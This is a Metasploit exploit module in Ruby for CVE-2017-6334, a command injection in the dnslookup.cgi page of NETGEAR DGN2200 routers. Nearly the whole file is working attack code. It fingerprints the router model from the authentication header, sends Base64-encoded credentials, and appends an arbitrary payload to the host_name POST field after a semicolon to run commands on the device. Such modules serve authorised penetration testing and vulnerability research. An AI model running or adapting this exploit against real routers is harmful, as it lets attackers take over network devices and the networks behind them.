# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;net/http&#039;
require "base64"
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                 => "Netgear DGN2200 dnslookup.cgi Command Injection",
      &#039;Description&#039;          => %q{
        This module exploits a command injection vulnerablity in NETGEAR
        DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request
        with valid login details.
      },
      &#039;License&#039;              => MSF_LICENSE,
      &#039;Platform&#039;             => &#039;unix&#039;,
      &#039;Author&#039;               => [
        &#039;thecarterb&#039;,  # Metasploit Module
        &#039;SivertPL&#039;     # Vuln discovery
      ],
      &#039;DefaultTarget&#039;        => 0,
      &#039;Privileged&#039;           => true,
      &#039;Arch&#039;                 => [ARCH_CMD],
      &#039;Targets&#039;              => [
        [ &#039;NETGEAR DDGN2200 Router&#039;, { } ]
      ],
      &#039;References&#039;           =>
        [
          [ &#039;EDB&#039;, &#039;41459&#039;],
          [ &#039;CVE&#039;, &#039;2017-6334&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 25 2017&#039;,
    ))
 
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to authenticate with&#039;, &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to authenticate with&#039;, &#039;&#039;])
      ])
 
    register_advanced_options(
    [
      OptString.new(&#039;HOSTNAME&#039;, [true, &#039;"Hostname" to look up (doesn\&#039;t really do anything important)&#039;, &#039;www.google.com&#039;])
    ])
    end
 
  # Requests the login page which tells us the hardware version
  def check
    res = send_request_cgi({&#039;uri&#039;=>&#039;/&#039;})
    if res.nil?
      fail_with(Failure::Unreachable, &#039;Connection timed out.&#039;)
    end
     # Checks for the `WWW-Authenticate` header in the response
    if res.headers["WWW-Authenticate"]
      data = res.to_s
      marker_one = "Basic realm=\"NETGEAR "
      marker_two = "\""
      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
      vprint_status("Router is a NETGEAR router (#{model})")
      model_numbers = [&#039;DGN2200v1&#039;, &#039;DGN2200v2&#039;, &#039;DGN2200v3&#039;, &#039;DGN2200v4&#039;]
      if model_numbers.include?(model)
        print_good("Router may be vulnerable (NETGEAR #{model})")
        return CheckCode::Detected
      else
        return CheckCode::Safe
      end
    else
      print_error(&#039;Router is not a NETGEAR router&#039;)
      return CheckCode::Safe
    end
  end
 
  def exploit
    check
 
    # Convert datastores
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    hostname = datastore[&#039;HOSTNAME&#039;]
 
    vprint_status("Using encoder: #{payload.encoder} ")
    print_status(&#039;Sending payload...&#039;)
 
    vprint_status("Attempting to authenticate with: #{user}:#{pass} (b64 encoded for auth)")
 
    creds_combined = Base64.strict_encode64("#{user}:#{pass}")
    vprint_status("Encoded authentication: #{creds_combined}")
 
    res = send_request_cgi({
      &#039;uri&#039;         => &#039;/dnslookup.cgi&#039;,
      &#039;headers&#039;     => {
        &#039;Authorization&#039; => "Basic #{creds_combined}"
      },
      &#039;vars_post&#039;   => {
        &#039;lookup&#039;    => &#039;Lookup&#039;,
        &#039;host_name&#039; => hostname + &#039;; &#039; + payload.encoded
    }})
 
  end
end

